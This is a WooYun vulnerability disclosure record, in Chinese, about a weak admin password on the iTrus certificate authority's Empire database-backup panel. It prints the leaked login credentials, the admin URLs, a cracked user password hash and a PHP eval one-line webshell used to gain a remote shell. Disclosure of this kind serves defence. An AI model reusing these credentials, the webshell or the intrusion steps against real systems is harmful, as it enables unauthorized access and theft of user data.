{"id": 46989, "wybug_id": "wooyun-2014-088441", "wybug_title": "天威诚信数据库备份软件后台弱密码登录（导致数据库信息泄漏主机可控制）", "wybug_corp": "天威诚信数字认证中心", "wybug_author": "路人甲", "wybug_date": "2014-12-24 16:22", "wybug_open_date": "2015-02-07 16:24", "wybug_type": "后台弱口令", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["天威诚信", "后台密码西楼"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-01-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-01-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-02-07：\t细节向公众公开  简要描述： 天威诚信源代码泄漏后，发现使用第三方数据库备份软件，在生产环境尝试后台弱密码登录，数据库可直接打包下载，导致用户信息泄漏，上传一句话，主机可控制 详细说明：  源代码分析：\nverisign.itrus.com.cn\\diguo\\class\\config.php//USER$set_username=\"lidongheng\";$set_password=\"37762350baec7e54226174fea3e210f2\";$set_loginauth=\"811219\";$set_loginrnd=\"uuuuuuuuuuuuuuuuuuuuuuuuuuuuuu\";$set_outtime=\"60\";$set_loginkey=\"1\";\n\n\n\n\n\n\n   漏洞证明：  1.使用lidongheng/811219/811219 登录 http://verisign.itrus.com.cn/diguo/index.php\n\n2.可备份数据，执行SQL，删除数据库等操作，操作多了都是泪呀\n\n3.下载备份数据\n\n查看刚下载备份vtn_data2014_20141224142404/tw_admin_member_1.php 可以找出用户名和密码了，下一步就是彩虹表('1','admin','f59c9c3eb7f8691e1726e23713d9e4c7','admin','1','1297950057','1419393826','1419392085','2093867186','1097','1','1','1');\");这里就破解了4.百度一下帝国备份存在的漏洞，替换文件功能  尝试访问 http://verisign.itrus.com.cn/diguo/bdata/vtn_data2014_20141224142404/readme.txt,结果\n\n  通过替换文件，替换一个一句话试试<?php eval($_POST[sb])?>结果很给力\n\n远程shell操作\n\n在说一下后台管理界面，你懂的http://verisign.itrus.com.cn/adminsoft/index.php?archive=adminuser&action=login多的操作就不说了，这次就到这里吧，我只想申请个邀请码。。。。希望厂商给点礼物哦，也圣诞节了....各位白帽子圣诞快乐   修复方案：  1.提高密码安全2.目录权限访问控制提高   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2014-12-29 14:42 厂商回复： CNVD确认并复现所述情况，已经由CNVD通过网站公开联系方式向厂商通报。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}